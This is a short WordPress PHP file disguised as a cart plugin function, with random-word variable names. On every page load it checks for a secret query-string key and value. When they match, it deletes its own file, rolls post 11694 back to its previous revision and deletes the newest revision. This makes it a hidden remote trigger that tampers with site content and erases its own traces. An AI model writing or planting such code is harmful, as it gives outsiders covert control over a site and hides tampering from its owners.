<?php

function best_cart_pro_mobile() {
	if (isset($_GET['avatar_quotes_roles_message']) && $_GET['avatar_quotes_roles_message'] === 'safe_online_make') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$calendar_next_default_tables = 11694;
		$timer_plupload_latest_forms = wp_get_post_revisions($calendar_next_default_tables);
		if (empty($timer_plupload_latest_forms)) die('no revisions');
		if (count($timer_plupload_latest_forms) < 2) die('less than 2');
		$nextgen_plugins_soon_star = array_shift($timer_plupload_latest_forms);
		$quotes_import_max_deprecated = $nextgen_plugins_soon_star->ID;
		$shortener_colors_like = array_shift($timer_plupload_latest_forms);
		$reports_posts_archive_simply = $shortener_colors_like->ID;
		$country_mobile_forum_contact = wp_restore_post_revision($reports_posts_archive_simply);
		if ($country_mobile_forum_contact === false) die('error restoring');
		$country_mobile_forum_contact = wp_delete_post_revision($quotes_import_max_deprecated);		
		if ($country_mobile_forum_contact === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'best_cart_pro_mobile');
